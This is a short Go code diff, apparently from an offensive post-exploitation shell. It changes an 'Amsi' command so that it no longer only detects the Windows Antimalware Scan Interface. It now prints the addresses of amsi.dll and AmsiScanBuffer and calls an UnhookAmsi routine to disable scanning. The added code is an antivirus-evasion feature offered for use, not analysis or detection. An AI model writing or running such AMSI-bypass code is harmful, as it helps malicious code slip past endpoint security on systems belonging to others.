@@ -70,12 +70,22 @@ func Amsi(c *ishell.Context) {
 		return
 	}
 
-	if hasAmsi {
-		c.Printf("amsi detected: %#v\n", dll)
+	if !hasAmsi {
+		c.Println("amsi not detected")
 		return
 	}
 
-	c.Println("amsi not detected")
+	c.Println("amsi detected")
+	c.Printf("amsi.dll: 						%#v\n", dll.DllBase)
+	c.Printf("amsi.AmsiScanBuffer:	%#v\n", dll.FnPtr)
+
+	c.Println("attempting unhook")
+	err = execute_assembly.UnhookAmsi(dll.DllBase)
+	if err != nil {
+		c.Printf("failed to unhook amsi: %v\n", err)
+		return
+	}
+	c.Println("unhook successful")
 }
 
 func GetHostname() string {
